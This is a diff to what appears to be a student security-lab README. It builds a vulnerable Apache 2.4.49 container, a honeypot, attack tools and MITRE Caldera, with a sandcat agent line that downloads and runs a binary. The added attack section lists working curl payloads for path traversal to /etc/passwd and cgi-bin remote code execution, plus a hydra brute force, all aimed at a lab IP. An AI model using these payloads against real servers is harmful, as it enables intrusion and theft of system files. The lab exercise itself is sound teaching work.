@@ -33,11 +33,23 @@ EXPOSE 80
 CMD ["/usr/local/apache2/bin/httpd", "-D", "FOREGROUND"])
 - after saving the file we need to build the image the containers will be using with the following command 'sudo docker build -t apache-2.4.49'
 - -then use 'sudo docker run -d -p 8080:80 apache-2.4.49' to make the container with apache running on port 8080
-# 3-Attack Tools:
+
+# 3- Honeypot:
+for the honeypot we picked HoneyUp which works okay with our service, but to be able to use honeyup we need to install nginx among other things to be able to fully use it and have logs to read after.
+
+- installing nginx using the following command sudo apt install nginx -y
+
+- using this command  sudo systemctl start nginx to make sure everything is running okay
+
+- we need the rust toolchain which we installed using curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+
+- and we needed rustup and cargo which we installed using sudo apt install cargo && sudo apt install rustup
+
+# 4-Attack Tools:
 we needed to install some tools that we might use for attacks and we used the following command
 
 -sudo apt install nmap metasploit-framework hydra gobuster nikto -y
-# 4-Caldera:
+# 5-Caldera:
 Caldera is a necessary part to complete the project so we followed these commands to install it correctly and making sure it runs without errors.
 
 -git clone https://github.com/mitre/caldera.git --recursive
@@ -50,5 +62,17 @@ Caldera is a necessary part to complete the project so we followed these command
 curl-s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download › splunkd;
 chmod +x splunkd;
 ./splunkd -server $server -group red -v)
+
+# 6-Attacks
+
+-we did the nmap scan on the target using (nmap --script vuln -p 8080 192.168.206.129).
+
+-one of the vulnerabilities in apache 2.4.49 is remote code execution we used this code to attack curl -X POST "http://192.168.206.129:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo RCE Test"
+
+-one of the vulnerabilities in apache 2.4.49 is path traversal we used this code to attack curl http://192.168.206.129:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+
+-one of the vulnerabilities in apache 2.4.49 is the fact that http trace is enabled we cannot really use it as an attack without having something else to use it with but we did use a command to see if it is enabled or not with curl -X TRACE http://192.168.206.129:8080 -I
+
+-using kali tools we managed to brute force our apache server using hydra tool with the following code hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 192.168.206.129 -s 8080 http-get / 
 
 
